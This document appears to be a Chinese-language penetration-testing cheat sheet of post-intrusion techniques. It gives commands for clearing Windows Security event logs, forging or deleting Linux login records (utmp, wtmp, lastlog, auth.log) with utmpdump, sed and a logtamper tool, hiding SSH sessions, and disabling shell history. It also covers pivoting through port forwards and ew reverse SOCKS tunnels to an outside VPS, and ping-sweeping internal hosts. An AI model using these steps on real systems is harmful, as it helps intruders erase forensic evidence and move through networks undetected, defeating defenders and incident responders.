## 日志
### windows 
1. 通过eventvwr.msc 打开事件查看器管理日志
2. windows 不同事件有不同的事件id
    ```
        4624  --登录成功   
        4625  --登录失败  
        4634 -- 注销成功
        4647 -- 用户启动的注销   
        4672 -- 使用超级用户（如管理员）进行登录
        4648 -- 远程到本机的记录

    ```

4. windows 日志有5钟
>应用程序

>安全

>Setup

>系统

>转发事件
5. 一般删除安全类日志 通过windwos 自带的wevtutil.exe 工具
    1. 获得Security的前十条日志(需要system权限)
    
    >wevtutil qe Security /f:text /c:10

    >Get-WinEvent -FilterHashtable @{logname="application";starttime=$date}
    2. 通过查看xml格式获得日志对应的EventRecordID(相当于编号)

    > wevtutil qe Security /f:xml /rd:true /c:10
    3. 删除所有日志(会生成一条删除日志的日志)(system权限)
    >wevtutil cl Security
    
### linux日志
#### ssh登录日志
1. touch  -r  a.txt b.txt 设置与b.txt一样的时间戳
2. `w` 查看当前登入系统的用户信息及用户当前的进程，用户登录信息来自`/var/run/utmp`
3. `lastlog` 列出所有用户最近登录的信息，或者指定用户的最近登录信息。lastlog引用的是/var/log/lastlog文件中的信息,ssh登录时会读取lastlog以提示上次登录的信息如
>Last login: Thu Feb 20 18:49:37 2020 from 171.91.140.94

4. `lastb`  `/var/log/btmp`：记录失败的登录尝试信息，默认由lastb命令查看。
5. `who`  /var/run/utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息
6. `users`  默认读取的是`/var/run/utmp`
7. `utmpdump` 用于转储二进制日志文件到文本格式的文件以便查看，同时也可以修改二进制文件 (上面的日志文件)  可以将其内容输出成为文本格式，并修改文本输出内容，然后将修改后的内容导入回二进制日志中
8. `last` 往回搜索`wtmp`来显示自从文件第一次创建以来登录过的用户


9. 通过如下方法更改文件以达到更改登录信息

        utmpdump /var/log/utmp > tmp_output.txt  //#导出文件信息

         #<使用文本编辑器修改 tmp_output.txt>

       utmpdump -r tmp_output.txt > /var/log/utmp




9. 最好的方法就是登录时候如下 看不到登录信息(不记录登录日志) -T 不要求分配终端(tty)
    
>ssh -T root@127.0.0.1 bash -i 

10. 或者用logtamper 工具
    
   10.1 清楚`w who users`记录也就是/var/run/utmp

>./logtamper-static -h root 171.91.140.94

   10.2  清楚last日志也就是/var/log/wtmp
 
 >./logtamper-static -w  root 171.91.141.79

   10.3 清楚lastlog也就是修改,或删除登录提示c语言写的有点问题，以后改一改，可以用这个python的
       https://github.com/re4lity/logtamper.git

13. lastlog 修改替换

>sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog


14. auth.log  /var/log/auth.log 或 /var/log/secure 存储来自可插拔认证模块(PAM)的日志，包括成功的登录，失败的登录尝试和认证方式(删除关键字的行)
> sed -i '/ip/,$ d' auth.log //从包含ip到最后一行都删除


#### 命令日志

1. linux 登录日志记录在`.bash_history`中，但每次执行的命令可以通过`history -c`将`目前shell`中的所有history命令消除,也不会写入日志`history` 查看当前日志

2. 不记录日志 `export HISTFILE=/dev/null` 或者 `export HISTSIZE=0;` 当前shell下不记录 
#### 程序日志
1. apache httpd.log   access.log  error.log 
2. mysql 家目录 .mysql_history
3. python .python_history

## 端口转发
### 内网之间转发
windows 自带工具进行转发

```java
 //本机监听10022端口,当有socket连接到10022端口时,本机就连接到192.168.2.53的22端口,本机的10022端口可以接受的连接地址为"*",使用的协议为tcp,当前仅支持传输控制协议 

C:\>netsh interface portproxy add v4tov4 listenport=10022 connectaddress=192.168.2.53 connectport=22 listenaddress=* protocol=tcp

//显示所有。

C:\>netsh interface portproxy show all

//删除配置: 本机的监听端口为10022,10022端口接受的连接地址为"*",使用的协议为tcp,当前仅支持TCP协议。
C:\>netsh interface portproxy delete v4tov4 listenport=10022 listenaddress=* protocol=tcp
//使用netsh interface portproxy记得配置Windows和出口路由器防火墙规则
```
linux 使用iptables 配置DNAT规则进行转发
```java
//第一条DNAT转发，转发本机2222端口到192.168.1.138机器

//开启转发
echo 1 > /proc/sys/net/ipv4/ip_forward
[root@ng1 ~]# iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.1.138:22
```
### 内网向外网转发
1. ew 内网让外网访问
```
外网机器
./ew_linux_x64 -s rcsocks -l 1985 -e 8985
内网机器
ew_win32.exe -s rssocks  -d vpsip -e 8985

```
2. 设置代理
有时候内网只有一台（主机1）可以访问内网资源，但这台不能访问外网，如果存在一台（主机2）外网主机可以访问，但主机2只能访问内网的主机1

```java
//在主机1上执行如下，意思是在本地建立socks5代理,端口为
ew_win32.exe -s ssocksd -l 7777 
//在主机2上执行也就是把外部端口1090的流量转发到内网192.168.32.170主机1上的7777端口上
ew_for_Win.exe -s lcx_tran -l 1090 -f 192.168.32.170 -g 7777
```
## 内网扫描
### ip收集
* 查看arp表
>arp -a 
* 通过ping 命令查找存活主机(linux)
> for i in `seq 1 255`; do ping -c 2 192.168.100."$i"|grep  "64 bytes" ;done
* windows 命令查找存活主机
>for /L %I in (1,1,254) do @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
